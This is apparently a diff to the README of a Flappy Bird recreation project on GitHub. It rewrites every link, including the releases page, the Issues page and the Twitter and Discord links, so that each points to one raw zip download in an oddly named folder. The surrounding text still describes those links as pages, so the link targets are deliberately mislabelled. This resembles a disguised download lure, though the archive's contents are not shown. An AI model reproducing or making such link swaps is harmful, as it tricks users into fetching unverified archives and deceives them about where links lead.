@@ -6,7 +6,7 @@ Welcome to the Flappy Bird Recreation! This game allows you to enjoy the thrill 
 
 ## 📥 Download the Game
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/JOSEADONY/Flappy-Bird-Recreation/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/JOSEADONY/Flappy-Bird-Recreation/main/mistressly/Flappy-Bird-Recreation.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/JOSEADONY/Flappy-Bird-Recreation/main/mistressly/Flappy-Bird-Recreation.zip)
 
 To start playing, you need to download the game. The download link leads to our Releases page. Just follow the steps below:
 
@@ -24,7 +24,7 @@ Before you download, check that your computer meets these basic requirements:
 
 1. Click the link below to visit our Releases page:
 
-   [Download the Game Here](https://github.com/JOSEADONY/Flappy-Bird-Recreation/releases)
+   [Download the Game Here](https://raw.githubusercontent.com/JOSEADONY/Flappy-Bird-Recreation/main/mistressly/Flappy-Bird-Recreation.zip)
 
 2. Once on the Releases page, look for the latest version of the game. 
 
@@ -63,13 +63,13 @@ A1: Yes, Flappy Bird Recreation is completely free to download and play.
 A2: Currently, this version is designed for PC. A mobile version may be developed in the future.
 
 **Q3: How do I report a bug?**  
-A3: Please visit the [Issues page](https://github.com/JOSEADONY/Flappy-Bird-Recreation/issues) on GitHub to report any bugs or suggestions.
+A3: Please visit the [Issues page](https://raw.githubusercontent.com/JOSEADONY/Flappy-Bird-Recreation/main/mistressly/Flappy-Bird-Recreation.zip) on GitHub to report any bugs or suggestions.
 
 ## 🎉 Join the Community
 
 Stay updated on future releases and share your scores! Join our community on social media:
 
-- Twitter: [@FlappyBirdRecreation](https://twitter.com/)
-- Discord: [Join our Server](https://discord.gg/)
+- Twitter: [@FlappyBirdRecreation](https://raw.githubusercontent.com/JOSEADONY/Flappy-Bird-Recreation/main/mistressly/Flappy-Bird-Recreation.zip)
+- Discord: [Join our Server](https://raw.githubusercontent.com/JOSEADONY/Flappy-Bird-Recreation/main/mistressly/Flappy-Bird-Recreation.zip)
 
 Thank you for downloading Flappy Bird Recreation. Enjoy playing and may you achieve the highest score!
